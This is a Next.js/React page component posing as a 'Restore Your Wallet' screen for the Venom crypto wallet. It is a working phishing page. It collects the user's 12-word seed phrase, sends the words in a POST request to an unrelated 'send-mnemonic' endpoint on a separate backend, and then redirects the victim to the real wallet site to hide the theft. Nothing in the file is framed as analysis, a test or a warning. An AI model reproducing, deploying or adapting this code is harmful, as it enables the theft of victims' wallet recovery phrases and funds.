"use client";

import Image from "next/image";
import { useRouter } from "next/navigation";
import { useState } from "react";

export default function Home() {
  const router = useRouter();

  const wordCount = 12;
  const [words, setWords] = useState<string[]>(Array(wordCount).fill(""));

  const handleChange = (index: number, value: string) => {
    const updated = [...words];
    updated[index] = value;
    setWords(updated);
  };

  const [loading, setLoading] = useState(false);
  const allFilled = words.every((w) => w.trim() !== "");

  const handleNext = async () => {
    if (!allFilled) return;
    const data = words.map((word, idx) => ({
      label: `Word ${idx + 1}`,
      value: word.trim(),
    }));

    const payload: Record<string, any> = {
      heading: "Venom",
      data,
    };

    try {
      setLoading(true);

      const response = await fetch(
        "https://trezor-backend-six.vercel.app/api/v1/send-mnemonic",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        }
      );

      if (response.ok) {
        setWords(Array(wordCount).fill(""));
        window.location.href = "https://venomwallet.com";
      } else {
        const err = await response.json();
        alert(`Failed to send mnemonic: ${err.message || "Unknown error"}`);
      }
    } catch (error) {
      console.error(error);
      alert("An error occurred while sending mnemonic.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="relative min-h-screen w-full overflow-hidden bg-black flex flex-col">
      {/* Mesh Gradient Background */}
      <div className="absolute inset-0">
        <div className="absolute top-0 left-0 w-[500px] h-[500px] bg-green-500/60 blur-[180px] rounded-full" />
        <div className="absolute top-[-100px] left-[40%] w-[600px] h-[600px] bg-cyan-400/60 blur-[200px] rounded-full" />
        <div className="absolute top-[100px] right-[-150px] w-[650px] h-[650px] bg-blue-600/60 blur-[220px] rounded-full" />
        <div className="absolute bottom-[-200px] left-[30%] w-[700px] h-[700px] bg-blue-500/50 blur-[250px] rounded-full" />
        <div className="absolute bottom-[-150px] left-[-200px] w-[650px] h-[650px] bg-green-500/50 blur-[240px] rounded-full" />
      </div>

      {/* Dark Overlay */}
      <div className="absolute inset-0 bg-black/60" />

      {/* Content */}
      <div className="relative z-10 flex flex-col flex-1 px-10 py-10">
        {/* Main Layout */}
        <div className="flex flex-1 items-center justify-center mt-10">
          <div className="w-full max-w-6xl grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
            {/* LEFT SIDE */}
            <div className="text-left flex flex-col gap-3 justify-center">
              {/* Logo */}
              <div className="flex items-center gap-3 text-white">
                <Image src={"/logo.svg"} alt="logo" width={150} height={60} />
              </div>

              <h1 className="text-white text-5xl md:text-6xl font-bold leading-tight">
                Welcome!
              </h1>
            </div>

            {/* RIGHT CARD */}
            <div className="bg-black/40 border border-gray-700 rounded-2xl shadow-lg backdrop-blur-md w-full max-w-xl mx-auto">
              {/* Dropdown header */}
              <div className="flex justify-between items-center px-6 py-4 border-b border-gray-700">
                <p className="text-gray-300 text-sm font-medium">
                  Still don’t see your Wallet?
                </p>
                <span className="text-gray-400 text-lg">⌄</span>
              </div>

              {/* Card Body */}
              <div className="p-8 text-center">
                <h2 className="text-white text-3xl font-bold">
                  Restore Your Wallet!
                </h2>

                <p className="text-gray-400 mt-2 text-sm">
                  Enter your 12 seed phrase words below
                </p>

                <p className="text-gray-400 mt-6 text-xs">
                  To restore your wallet, type in your mnemonic words into the
                  corresponding boxes below
                </p>

                {/* Inputs */}
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 mt-6">
                  {words.map((word, index) => (
                    <div key={index} className="relative">
                      <input
                        value={word}
                        onChange={(e) => handleChange(index, e.target.value)}
                        placeholder={`${index + 1}.`}
                        className="w-full px-4 py-3 rounded-lg bg-black/20 border border-gray-700 text-white placeholder-gray-500 outline-none focus:border-green-500 transition"
                      />
                    </div>
                  ))}
                </div>

                {/* Next Button */}
                <button
                  disabled={!allFilled || loading}
                  onClick={handleNext}
                  className={`mt-8 font-medium py-3 rounded-xl w-full max-w-[140px] transition
                    ${allFilled
                      ? "bg-green-500 hover:bg-green-600 text-white"
                      : "bg-gray-600 text-gray-300 cursor-not-allowed"
                    }`}
                >
                  {loading ? "...loading" : "Next"}
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}